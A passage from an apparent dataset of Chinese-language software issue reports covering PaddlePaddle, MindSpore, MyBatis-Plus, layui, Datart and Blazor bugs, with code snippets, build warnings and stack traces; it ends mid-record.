MacOsX run pserver failed: *--*.whl is not a valid wheel filename.,"mac上通过 pip install paddlepaddle之后，跑pserver 报错 检查目录 并不存在   <code>: sudo -H paddle pserver --port=7164 --ports_num=1 --ports_num_for_sparse=1 --num_gradient_servers=1 --nics=eth0 /usr/local/bin/paddle: line 82: [: 1.0.2: binary operator expected File ""&lt;stdin&gt;"", line 3 if LooseVersion(""1.0.2 ^ SyntaxError: EOL while scanning string literal First time run paddle, need to install some python dependencies. Requirement '/usr/local/bin/../opt/paddle/share/wheels/*--*.whl' looks like a filename, but the file does not exist *--*.whl is not a valid wheel filename. pip install wheels failed. Please use 'sudo paddle' at the first time you use PaddlePaddle PaddlePaddle will install some python dependencies automatically. /usr/local/bin/../opt/paddle/share/wheels/"
ry-ui.js封装的$.modal.openOptions把layer.open的按钮回调功能丧失了,"这里如果再定义options.btn2回调方法不起作用   <code>: layer.open({ content: 'test' ,btn: ['按钮一', '按钮二', '按钮三'] ,yes: function(index, layero){ //按钮【按钮一】的回调 } ,btn2: function(index, layero){ //按钮【按钮二】的回调 //return false 开启该代码可禁止点击该按钮关闭 } ,btn3: function(index, layero){ //按钮【按钮三】的回调 //return false 开启该代码可禁止点击该按钮关闭 } ,cancel: function(){ //右上角关闭回调 //return false 开启该代码可禁止点击该按钮关闭 } }); options.btn: ['&lt;i class=""fa fa-check""&gt;&lt;/i&gt; 确认', '&lt;i class=""fa fa-check""&gt;&lt;/i&gt; 提交审核', '&lt;i class=""fa fa-close""&gt;&lt;/i&gt; 关闭'];"
用户使用momentum optimizer时出现cast op输入不存在错误,"用户反馈在使用momentum optimizer时append backward出现cast op错误，用其他optimizer未出现错误。 Paddle版本release 1.2。 code: 错误log（编译期错误）： 解决方案：将某些不需要梯度的变量设置为stop_gradient=True，例如   <code>: def balanced_cross_entropy_bootstrap_loss(prediction, gt_org, average_flag = True, bootstrapped_threshold=0.95): class_num = prediction.shape[1] #get gt_mask gt = fluid.layers.reshape(gt_org, [0, 1, gt_org.shape[-2], gt_org.shape[-1]]) gt_mask = (gt==0).astype('float32') for i in range(1, class_num): gt_mask_i = (gt==i).astype('float32') gt_mask = fluid.layers.concat([gt_mask, gt_mask_i], axis=1) #get valid_mask valid_mask = (gt &lt; class_num).astype('float32') valid_mask = fluid.layers.expand(valid_mask, [1, class_num, 1, 1]) #bootstrap prediction = prediction.astype('float32') pred = fluid.layers.argmax(prediction, axis=1).astype('float32') pred = fluid.layers.reshape(pred, [0, 1, pred.shape[-2], pred.shape[-1]]) bootstrap_valid1 = (pred == gt).astype('float32') bootstrap_valid1 = fluid.layers.expand(bootstrap_valid1, [1, class_num, 1, 1]) bootstrap_valid2 = (prediction &gt; bootstrapped_threshold).astype('float32') bootstrap_valid = fluid.layers.elementwise_mul(bootstrap_valid2, bootstrap_valid1) bootstrap_mask = (1.0 - bootstrap_valid).astype('float32') #print(bootstrap_mask) #print(valid_mask) valid_mask = fluid.layers.elementwise_mul(bootstrap_mask, valid_mask).astype('float32') #get valid gt_mask #gt_mask = fluid.layers.elementwise_mul(gt_mask, valid_mask).astype('float32') #get balanced weight count_num = fluid.layers.reduce_sum(gt_mask, dim=[2, 3]).astype('float32') count_num = fluid.layers.elementwise_max(count_num, fluid.layers.assign(np.array([0.00001], dtype=np.float32))) balanced_weight = 1 - count_num/fluid.layers.reduce_sum(count_num, dim=1).astype('float32') #count_num [n,c] balanced_gt_mask = fluid.layers.elementwise_mul(gt_mask, balanced_weight, axis=0).astype('float32') #gt_mask=[n,c,h,w] balanced_weight=[n,c] prediction = fluid.layers.softmax(prediction).astype('float32') prediction = fluid.layers.elementwise_max(prediction, fluid.layers.assign(np.array([0.00001], dtype=np.float32))) prediction = fluid.layers.log(prediction).astype('float32') loss_mask = fluid.layers.elementwise_mul(prediction, balanced_gt_mask, axis=0) if average_flag: valid_loss = fluid.layers.reduce_mean(fluid.layers.elementwise_mul(loss_mask, valid_mask)) #valid_loss = fluid.layers.reduce_mean(loss_mask) else: valid_loss = fluid.layers.reduce_sum(fluid.layers.elementwise_mul(loss_mask, valid_mask, axis=0)) return valid_mask, -1*valid_loss The input of cast op must be set. bootstrap_mask.stop_gradient = True valid_mask.stop_gradient = True"
 Online表单开发中新增或编辑时浏览器控制台报出警告,版本号：   <code>: vue前端 vue-antd-jeecg ：3.0.0 Online表单开发中点击新增，或选择任意数据点击编辑，浏览器控制台都会报出警告
starter-oracle.sql 中的 core_menu 表中的“代码生成**”值与 starter-mysql.sql 及 CoreCodeGenService.java 中的不一致,"建议： 将 中的“代码生成管理”改为“代码生成导航”。 起因： 使用 Oracle 数据库对应的 创建数据库后，生成代码选择“添加到菜单”后，一直无法添加到菜单。 过程： 查数据库的 表发现无此代码功能，查控制台信息发现： 发现 中 而 表中只有“代码生成管理”。 就想到是创建数据库问题，对比 和 发现，两者在插入 表时有关“代码生成**”的项不一致，Oracle 版为“代码生成管理”，Mysql 版为“代码生成导航”。   <code>: starter-oracle.sql orcale-stater.sql core_menu com.ibeetl.admin.core.service.CoreCodeGenService insertMenu 194 - 未找到对应的父菜单:代码生成导航 CoreCodeGenService.java Line 190 query.setCode(""代码生成导航""); core_menu starter-oracle.sql starter-mysql.sql core_menu"
【众智】【计算-AICPU开发】DenseToDenseSetOperation,"DenseToDenseSetOperation 1.1 功能介绍 对2个输入Tensor的最后一个维度应用'set'(去重)操作 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/sparse_ops.py class DenseToDenseSetOperation(Primitive): 无反向   <code>: REG_OP(DenseToDenseSetOperation) .INPUT(x1, TensorType({DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, \ DT_INT32, DT_INT64, DT_STRING})) .INPUT(x2, TensorType({DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, \ DT_INT32, DT_INT64, DT_STRING})) .OUTPUT(y_indices, TensorType({DT_INT64})) .OUTPUT(y_values, TensorType({DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, \ DT_INT32, DT_INT64, DT_STRING})) .OUTPUT(y_shape, TensorType({DT_INT64})) .ATTR(set_operation, String, """") .ATTR(validate_indices, Bool, true) .OP_END_FACTORY_REG(DenseToDenseSetOperation)"
源代码实施 Google Java Style 代码风格规范及相关文档、工具,源代码实施 Google Java Style 代码风格规范及相关文档、工具。具体看 styleguide 分支，docs/styleguide 。 特别指出，因为涉及较大的修改，建议上游 master 如果最近有较多修改，可以关闭这次 PR ，等待 master 更新后，由我再整合之后重新 PR 。 特别指出，目前还有最后 13 处涉及名称 Names 相关的不规范项未处理，因为涉及重构、兼容，待谨慎处理。例如： 特别指出，现在补充的某些 Javadoc ，是由 IDEA 的 Javadoc 插件自动生成，有意义，后面有需要时可以由开发再补充完善。 感谢。目前纯属个人想法，觉得有必要应用一个代码风格规范，有利于保证代码质量的任何措施都值得实施。   <code>: Checkstyle found 13 item(s) in 12 file(s) ActionATGServiceImpl.java : 1 item(s) 名称 'ActionATGServiceImpl' 中不能出现超过 '2' 个连续大写字母。 (33:0) [AbbreviationAsWordInName] ActionCGServiceImpl.java : 1 item(s) 名称 'ActionCGServiceImpl' 中不能出现超过 '2' 个连续大写字母。 (33:0) [AbbreviationAsWordInName] ... TaskDTO.java : 1 item(s) 名称 'TaskDTO' 中不能出现超过 '2' 个连续大写字母。 (30:0) [AbbreviationAsWordInName] UserDTO.java : 1 item(s) 名称 'UserDTO' 中不能出现超过 '2' 个连续大写字母。 (38:0) [AbbreviationAsWordInName]
Modal框弹出时，绑定数据无法刷新显示,"1.创建Modal，绑定数据对象 2.弹出显示 3.对话框所有字段无数据，输入其中一项，点击别的地方，所有字段刷新出来了 无 组件版本 latest 浏览器 all Server Side   <code>: @page ""/table"" &lt;Table TItem=""Foo"" IsPagination=""true"" PageItemsSource=""@PageItemsSource"" IsStriped=""true"" IsBordered=""true"" ShowSkeleton=""true"" IsMultipleSelect=""true"" ShowToolbar=""true"" ShowSearch=""true"" ShowExtendButtons=""true"" UseInjectDataService=""true"" AutoGenerateColumns=""true""&gt; &lt;TableColumns&gt; &lt;TableColumn @bind-Field=""@context.Name"" Filterable=""true"" TextEllipsis=""true"" ShowTips=""true"" /&gt; &lt;TableColumn @bind-Field=""@context.Address"" Filterable=""true"" TextEllipsis=""true"" ShowTips=""true"" /&gt; &lt;TableColumn @bind-Field=""@context.Hobby"" Data=""@Hobbys"" /&gt; &lt;/TableColumns&gt; &lt;RowButtonTemplate&gt; &lt;TableCellButton Size=""Size.ExtraSmall"" Color=""Color.Primary"" TItem=""Foo"" Item=""@context"" Icon=""fa fa-pencil"" Text=""test"" OnClickCallback=""@(() =&gt; OnEditClick(context))"" /&gt; &lt;/RowButtonTemplate&gt; &lt;/Table&gt; &lt;Modal @ref=""Modal""&gt; &lt;ModalDialog @ref=""ModalDialog"" IsDraggable=""true"" Size=""Size.ExtraLarge"" Title=""论文评审结果汇总""&gt; &lt;BodyTemplate&gt; &lt;table&gt; &lt;tbody&gt; &lt;tr style=""height:60px""&gt; &lt;td&gt; &lt;div class=""input-group-prepend""&gt; &lt;div class=""input-group-text""&gt; &lt;span style=""width:100px""&gt;姓名:&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td width=""100%""&gt; &lt;BootstrapInput @bind-Value=""@cur.Name"" ShowButton=""true"" Max=""100"" Min=""50""&gt;&lt;/BootstrapInput&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr style=""height:60px""&gt; &lt;td&gt; &lt;div class=""input-group-prepend""&gt; &lt;div class=""input-group-text""&gt; &lt;span style=""width:100px""&gt;地址:&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td width=""100%""&gt; &lt;BootstrapInput @bind-Value=""@cur.Address"" ShowButton=""true"" Max=""100"" Min=""50""&gt;&lt;/BootstrapInput&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr style=""height:60px""&gt; &lt;td&gt; &lt;div class=""input-group-prepend""&gt; &lt;div class=""input-group-text""&gt; &lt;span style=""width:100px""&gt;count:&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td width=""100%""&gt; &lt;BootstrapInput @bind-Value=""@cur.Count"" ShowButton=""true"" Max=""100"" Min=""50""&gt;&lt;/BootstrapInput&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/BodyTemplate&gt; &lt;/ModalDialog&gt; &lt;/Modal&gt; ---------------------------------- private Modal? Modal { get; set; } private ModalDialog? ModalDialog { get; set; } private Foo cur = new Foo(); Task&lt;bool&gt; OnEditClick(Foo item) { cur = item; Modal?.Show(); return Task.FromResult(true); }"
Design doc of functor,We should make Paddle fast even we using . So we should give a way to fuse many fine-grained functors to a single GPU kernel. The design doc should be written first.   <code>: Operator
"some compile warning with MKLDNN related codes, etc","There are some compile warning with MKLDNN, the full log is https://paddleci.ngrok.io/viewLog.html?buildId=19199&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog: https://github.com/01org/mkl-dnn/issues/157 Trainer.cpp <ol start=""3""> beam_search_op.cc <ol start=""4""> test_MKLDNN.cpp   <code>: [09:53:57]W: [Step 1/1] /paddle/build/third_party/mkldnn/src/extern_mkldnn/src/cpu/jit_avx512_common_conv_kernel.cpp: In lambda function: [09:53:57]W: [Step 1/1] /paddle/build/third_party/mkldnn/src/extern_mkldnn/src/cpu/jit_avx512_common_conv_kernel.cpp:2666:42: warning: assuming signed overflow does not occur when assuming that (X + c) &lt; X is always false [-Wstrict-overflow] [09:53:57]W: [Step 1/1] auto emit_fma_block = [&amp;](int kh_step) { [09:53:57]W: [Step 1/1] [09:55:41]W: [Step 1/1] /paddle/paddle/trainer/Trainer.cpp:141:5: required from here [09:55:41]W: [Step 1/1] /paddle/build/third_party/install/glog/include/glog/logging.h:717:32: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [09:55:41]W: [Step 1/1] DEFINE_CHECK_OP_IMPL(Check_EQ, ==) // Compilation error with CHECK_EQ(NULL, x)? [09:55:41]W: [Step 1/1] ^ [09:55:41]W: [Step 1/1] /paddle/build/third_party/install/glog/include/glog/logging.h:148:53: note: in definition of macro 'GOOGLE_PREDICT_TRUE' [09:55:41]W: [Step 1/1] #define GOOGLE_PREDICT_TRUE(x) (__builtin_expect(!!(x), 1)) [09:55:41]W: [Step 1/1] ^ [09:55:41]W: [Step 1/1] /paddle/build/third_party/install/glog/include/glog/logging.h:717:1: note: in expansion of macro 'DEFINE_CHECK_OP_IMPL' [09:55:41]W: [Step 1/1] DEFINE_CHECK_OP_IMPL(Check_EQ, ==) // Compilation error with CHECK_EQ(NULL, x)? [09:55:41]W: [Step 1/1] ^ [09:57:28]W: [Step 1/1] /paddle/paddle/operators/beam_search_op.cc: In member function 'bool paddle::operators::BeamSearch::NextItemSet(std::vector&lt;paddle::operators::BeamSearch::Item&gt;*)': [09:57:28]W: [Step 1/1] /paddle/paddle/operators/beam_search_op.cc:142:23: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [09:57:28]W: [Step 1/1] for (int d = 0; d &lt; instance_dim; d++) { [09:57:28]W: [Step 1/1] ^ [10:13:00]W: [Step 1/1] /paddle/paddle/gserver/tests/test_MKLDNN.cpp:318:3: required from here [10:13:00]W: [Step 1/1] /paddle/build/third_party/install/glog/include/glog/logging.h:721:32: warning: comparison between signed and unsigned integer expressions [-Wsign-compare] [10:13:00]W: [Step 1/1] DEFINE_CHECK_OP_IMPL(Check_GE, &gt;=) [10:13:00]W: [Step 1/1] ^ [10:13:00]W: [Step 1/1] /paddle/build/third_party/install/glog/include/glog/logging.h:148:53: note: in definition of macro 'GOOGLE_PREDICT_TRUE' [10:13:00]W: [Step 1/1] #define GOOGLE_PREDICT_TRUE(x) (__builtin_expect(!!(x), 1)) [10:13:00]W: [Step 1/1] ^ [10:13:00]W: [Step 1/1] /paddle/build/third_party/install/glog/include/glog/logging.h:721:1: note: in expansion of macro 'DEFINE_CHECK_OP_IMPL' [10:13:00]W: [Step 1/1] DEFINE_CHECK_OP_IMPL(Check_GE, &gt;=) [10:13:00]W: [Step 1/1] ^"
使用mssql数据源报错,Datart版本号 1.0.0 配置后点测试，一直转圈圈，查看后台报错如下： 运行环境详情： OS: Win7 数据源: 不重要吧，没到这一步呢 浏览器: Chrome 103 我记得在davinci里也报过类似的错，好像是拷贝了一个数据源的.jar包解决的。但这边填写表单的时候，下面识别出了“com.microsoft.sqlserver.jdbc.SQLServerDriver”呀，所以我认为它是默认支持sqlserver的。   <code>: 2023-01-05 17:45:40.542 ERROR d.d.provider.jdbc.adapters.JdbcDataProviderAdapter : Driver class not found com.microsoft.sqlserver.jdbc.SQLServerDriver java.lang.ClassNotFoundException: com.microsoft.sqlserver.jdbc.SQLServerDriver at java.net.URLClassLoader.findClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Unknown Source) at datart.data.provider.jdbc.adapters.JdbcDataProviderAdapter.test(JdbcDataProviderAdapter.java:98) at datart.data.provider.JdbcDataProvider.test(JdbcDataProvider.java:67) at datart.data.provider.ProviderManager.testConnection(ProviderManager.java:82) at datart.server.service.impl.DataProviderServiceImpl.testConnection(DataProviderServiceImpl.java:121) at datart.server.controller.DataProviderController.testConnection(DataProviderController.java:62) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)
"使用穿梭框 ，后台提示：""GET /BsetUserRight/transfer.js HTTP/1.1"" 404 34896","页面代码： {% extends 'views/base_lay.html' %} {% load staticfiles %} {% block css%} {% endblock %} {% block jsstart %} &lt;script type=""text/javascript"" src=""{% static 'layuiadmin/layui/layui.js' %}""&gt;&lt;/script&gt; &lt;script type=""text/javascript"" src = ""{% static 'layui/user/userright.js' %}""&gt;&lt;/script&gt; {% endblock %} {% block content %} <div> {% endblock %} js代码： layui.use(['transfer','layer','util'],function(){ var $ = layui.$ // ,form = layui.form ,layer = layui.layer // ,laydate=layui.laydate ,transfer=layui.transfer ,util=layui.util; }); 打开网页后台提示： ""GET /BsetUserRight/transfer.js HTTP/1.1"" 404 34896 Chrome浏览器控制中提示： VM8825 layui.js:2 GET http://localhost/BsetUserRight/transfer.js net::ERR_ABORTED 404 (Not Found) n.use @ VM8825 layui.js:2 (anonymous) @ VM8826 userright.js:1 请问哪里出了问题？   <code>: &lt;div class=""body-content"" &gt; &lt;form class=""layui-form"" lay-filter=""maincreat"" method=""POST"" enctype=""multipart/form-data""&gt; {% csrf_token %} &lt;div class=""layui-form-item"" style=""width: 100%""&gt; &lt;label class=""layui-form-label"" style=""width:100%;text-align: left;margin-left:5%;font-size: medium"" &gt;本页面为批量设置用户权限，请根据需要选择用户菜单权限和系统功能权限&lt;/label&gt; &lt;/div&gt; &lt;div&gt;&lt;hr class=""layui-bg-blue""&gt;&lt;/div&gt; &lt;div class=""layui-form-item"" style=""width: 100%;""&gt; &lt;label class=""layui-form-label"" style=""width:8%;text-align: left;font-size: medium"" &gt;选择用户：&lt;/label&gt; &lt;div class=""layui-input-inline"" style=""width: 20%;""&gt; &lt;input type=""text"" class=""layui-input"" id=""usrdata"" lay-filter=""usrdata"" name=""usrdata"" style=""width:100%;""&gt; &lt;/div&gt; &lt;label class=""layui-form-label"" style=""width:15%;font-size: medium"" &gt;选择菜单权限：&lt;/label&gt; &lt;div class=""layui-input-inline""style=""width:23%;font-size: medium""&gt; &lt;p&gt;{{objs_menu}}&lt;/p&gt; &lt;/div&gt; &lt;div class=""layui-input-inline"" style=""width: 20%;""&gt; &lt;button class=""layui-btn"" lay-submit=""lay-submit"" lay-filter=""submit1"" name=""submit1"" &gt;确认用户&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=""cs_menu"" class=""demo-transfer""&gt;&lt;/div&gt; &lt;div&gt;&lt;hr&gt;&lt;/div&gt; &lt;div class=""layui-form-item"" style=""width: 100%""&gt; &lt;div class=""layui-input-inline"" style=""margin-left: 5%;width: 80%;text-align: center;""&gt; &lt;button class=""layui-btn"" lay-submit=""lay-submit"" lay-filter=""submit1"" name=""submit1"" &gt;生成子表&lt;/button&gt; &lt;/div&gt; &lt;div class=""layui-input-inline"" style=""margin-left: 85%;""&gt; &lt;input type=""hidden"" class=""layui-input"" value=""{{result}}"" id=""res"" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=""layui-form-item"" &gt; &lt;div class=""field"" align=""center""&gt; &lt;button class=""layui-btn"" lay-submit="""" lay-filter=""subreturn"" style=""margin-top: 20px;""&gt;返 回&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; //var token = $('input[name=csrfmiddlewaretoken]').val(); //var csrf_tokens = ""{{ csrf_token() }}"" //以上行为是获取网页的CSRF值 //载入表中日期格式组件 // laydate.render({ // elem: '#date' //指定元素 // ,type:'month' // ,value: new Date (new Date()-30*1000*60*60*24) // }); //用户菜单穿梭框 transfer.render({ elem: '#cs_menu' //绑定元素 ,data: [ {""value"": ""1"", ""title"": ""李白"", ""disabled"": """", ""checked"": """"} ,{""value"": ""2"", ""title"": ""杜甫"", ""disabled"": """", ""checked"": """"} ,{""value"": ""3"", ""title"": ""贤心"", ""disabled"": """", ""checked"": """"} ] ,id: 'cs_menu' //定义索引 }); form.on('submit(subreturn)', function(){ parent.layui.admin.events.closeThisTabs(); return false; });"
升级 Spring Cloud Alibaba 2.2.1,环境信息 pigx版本: 3.8.0 是否修改包名: 否 spring cloud alibaba 2.2.1   <code>: &lt;!--spring cloud alibaba--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-alibaba.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt;
V1.8 GPU环境下，使用nonzero() 算子会产生一些莫名其妙的错误。,"V1.8 GPU环境下，使用nonzero() 算子会影响一些莫名其妙的错误。 / 硬件环境: GPU : -- MindSpore version : 1.8 -- Python version : 3.7 -- OS platform and distribution : Centos 7 -- GCC/Compiler version : (/): /mode pynative 我是做3d点云语义分割任务。 原本我的代码是基于MindSporeV1.1版本进行开发，基于此版代码能够顺利训练网络。 代码里面有个需求，就是需要在输入的point clound数据，根据point的label，来动态的将point分为有效的（valid）和无效的（valid）的point。在V1.7版本中，我是通过mask来区分点的有效与无效，相关的代码如下： 当MindSpore有V1.8后，我想使用 nonzero()算子来获取 无效/有效 点的索引，拿到索引后在使用gather()算子，从而得到 有效点的Tensor和无效点的Tensor。 但是，在原本代码的基础进行修改，添加nonzero()等算子后，程序会出现许多莫名其妙的错误。 修改后的代码： 会出现的错误： P.SoftmaxCrossEntropyWithLogits() 无法使用。（这个倒还好，如上面代码所示，我通过Softmax,log, reduce_sum等算子的组合，实现了SoftmaxCrossEntropyWithLogits） 明明没有使用UnsortedSegmentSum算子，但会报UnsortedSegmentSum的错误 TopK() 算子无法正常使用 P.scatter_nd（）无法正常使用。会出现的错误。   <code>: logits = logits_embed[..., :self.num_classes] # (B,N,45) -&gt; (B,N,13) pred_embed = logits_embed[..., self.num_classes:] # (B,N,45) -&gt; (B,N,32) logits = logits.reshape((-1, self.num_classes)) pred_embed = pred_embed.reshape((-1, 32)) # logit = logits.reshape((-1, self.num_classes)) # (B*N,13) labels = labels.reshape((-1,)) # (b,n) -&gt; (b*n) xyzrgb = xyzrgb.reshape((-1, 6)) # (b,n,6) -&gt; (b*n,6) # Boolean mask of points that should be ignored # (B*N,) ignore_mask = P.zeros_like(labels).astype(mstype.bool_) for ign_label in self.ignored_label_inds: ignore_mask = P.logical_or(ignore_mask, P.equal(labels, ign_label)) # # 0为无效,1为有效 valid_mask = P.logical_not(ignore_mask) # (B*N,) # (B*N,13) one_hot_labels = self.onehot(labels) # (B*N,) -&gt; (B*N,13) weights = self.weights * one_hot_labels * valid_mask.reshape(-1, 1) # (B*N,13) # 输出Tensor各维度上的和，以达到对所有维度进行归约的目的。也可以对指定维度进行求和归约 # (B*N, 13) -&gt; (B*N,) weights = P.ReduceSum()(weights, 1) # # (B*N,) and (B*N,13) -&gt; unweighted_loss = self.loss_fn(logits, one_hot_labels) # logits.dtype=Float32 ; one_hot_labels.dtype=Float32 -&gt; unweighted_loss.dtype=Float32 weighted_loss = unweighted_loss * weights # unweighted_loss.dtype = Float32 ; weights.dtype = Float64 weighted_loss = weighted_loss * valid_mask loss_sum = P.ReduceSum()(weighted_loss) valid_num = P.count_nonzero(valid_mask.astype(mstype.int32)) CE_loss = loss_sum / valid_num logits_embed = logits_embed.reshape((-1, self.num_classes + 32)) # (B,N,45) -&gt; (B*N,45) logits = logits_embed[..., :self.num_classes] # (B,N,45) -&gt; (B,N,13) pred_embed = logits_embed[..., self.num_classes:] # (B,N,45) -&gt; (B,N,32) # size = labels.shape[0] * labels.shape[1] labels = labels.reshape((-1,)) # (b,n) -&gt; (b*n) xyzrgb = xyzrgb.reshape((-1, 6)) # (b,n,6) -&gt; (b*n,6) # Boolean mask of points that should be ignored ignored_bool = P.zeros_like(labels).astype(mstype.bool_) for ign_label in self.ignored_label_inds: ignored_bool = P.logical_or(ignored_bool, P.equal(labels, ign_label)) # # Collect logits and labels that are not ignored valid_idx = P.squeeze(P.nonzero(P.logical_not(ignored_bool))) invalid_idx = P.squeeze(P.nonzero(ignored_bool)) # valid_logits = logits valid_logits = P.gather(logits, valid_idx, axis=0) invalid_logits = P.gather(logits, invalid_idx, axis=0) invalid_embed = P.gather(pred_embed, invalid_idx, axis=0) valid_embed = P.gather(pred_embed, valid_idx, axis=0) # valid_xyzrgb = P.gather(xyzrgb, valid_idx, axis=0) valid_labels_init = P.gather(labels, valid_idx, axis=0) valid_labels = valid_labels_init # =============&gt; calculate the weighted cross entropy according to the inverse frequency one_hot_labels = self.onehot(valid_labels) # (B*N,) -&gt; (B*N,13) weights = P.reduce_sum(self.weights * one_hot_labels, 1) # # weights = self.weights * one_hot_labels # weights = weights.sum(axis=1) # 输出Tensor各维度上的和，以达到对所有维度进行归约的目的。也可以对指定维度进行求和归约 # (B*N, 13) -&gt; (B*N,) ### SoftmaxCrossEntropyWithLogits### valid_logits = nn.Softmax()(valid_logits) # unweighted_loss = -one_hot_labels * P.log(valid_logits) # unweighted_loss = unweighted_loss.sum(axis=1) unweighted_loss = P.mul(P.reduce_sum(one_hot_labels * P.log(valid_logits), axis=1), -1) # unweighted_loss = P.SoftmaxCrossEntropyWithLogits()(valid_logits, one_hot_labels) # unweighted_loss = self.loss_fn(valid_logits, one_hot_labels) # logits.dtype=Float32 ; one_hot_labels.dtype=Float32 -&gt; unweighted_loss.dtype=Float32 ### weighted_loss = unweighted_loss * weights # unweighted_loss.dtype = Float32 ; weights.dtype = Float64 print(weighted_loss.size, valid_logits.size, invalid_logits.size) CE_loss = weighted_loss.sum() / (weighted_loss.size + 1e-7) ValueError: For 'ScatterNd', the input[shape] should be a tuple with all positive item. but got (13, -1, )"
目前是不是还不支持mybatis的example,"目前是否还是不支持对example的查询，下面的查询直接报错了   <code>: PageHelper.startPage(pageNum, pageSize, true); YlwProductExample example = new YlwProductExample(); example.createCriteria(); List&lt;YlwProduct&gt; productList = ylwProductMapper.selectByExample(example);"
Remove optimize_op argument from get_pserver_program method of Distributed Transpiler,It seems like we do not need this parameter because we already provide the optimize ops in method.   <code>: transpile
Should move content in /paddle/testing/TestUtil.cpp to various packages,"For example, function should be moved to , where Matrix was defined.   <code>: makeRandomSparseMatrix paddle/math"
请问一下8081是什么服务？在文档中好象没有提起，但在VUE的配置文档中有提到,"proxy: { // detail: https://cli.vuejs.org/config/#devserver-proxy [process.env.VUE_APP_BASE_API]: { target: , changeOrigin: true, pathRewrite: { ['^' + process.env.VUE_APP_BASE_API]: '' } }, ['/api/v4']: { target: , changeOrigin: true, // logLevel: 'debug', }, }, 这里的http://localhost:8081 是什么服务？我启动哪一个？ console提示如下错误： Proxy error: Could not proxy request /api/v4/clients?_limit=10&amp;_page=1 from localhost to http://localhost:8081/ (ECONNREFUSED).   <code>: http://localhost:8080 http://localhost:8081"
分页插件排序问题,"当前使用版本 2.3 排序传入一个叫 start 的字段 生成的sql 会重复生成这个字段的 ORDER BY start ASC ORDER BY start ASC LIMIT 0,10 其他字段我试过就发现这一个其他都是正常的排序 前端传入 排序该字段 SELECT cid AS cid,sid,tid,,,,remark,s_word AS sWord,t_word AS tWord,order_id AS orderId,goods_id AS goodsId,del_flag AS delFlag,dept_id AS deptId FROM tb_course WHERE del_flag=0 AND ( (dept_id in(3))) ORDER BY start ASC ORDER BY start ASC LIMIT 0,10 Error querying database. Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ORDER BY start ASC LIMIT 0,10' at line 4   <code>: start end status"
自动填充 oracle 下date型填充失败,"当前使用版本 3.4.1 mybatisplus 自动填充功能 ，Date型填充失败，string和number型正常，oracle11数据库 // @TableField(value=""CREATE_TIME"", fill = FieldFill.INSERT) // @TableField(""CREATE_TIME"") @TableField(fill = FieldFill.INSERT) private LocalDateTime createTime; // @TableField(""UPDATE_TIME"") @TableField(value=""UPDATE_TIME"", fill = FieldFill.UPDATE) private LocalDateTime updateTime; // this.strictInsertFill(metaObject, ""createTime"", LocalDateTime.class, LocalDateTime.now()); // 起始版本 3.3.0(推荐使用) org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.type.TypeException: Could not set parameters for mapping: ParameterMapping{property='createTime', mode=IN, javaType=class java.time.LocalDateTime, jdbcType=null, numericScale=null, resultMapId='null', jdbcTypeName='null', expression='null'}. Cause: org.apache.ibatis.type.TypeException: Error setting non null for parameter #5:缓存问题 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: java.sql.SQLException: 无效的列类型 at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:92) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:440) at com.sun.proxy.$Proxy80.insert(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:271) at 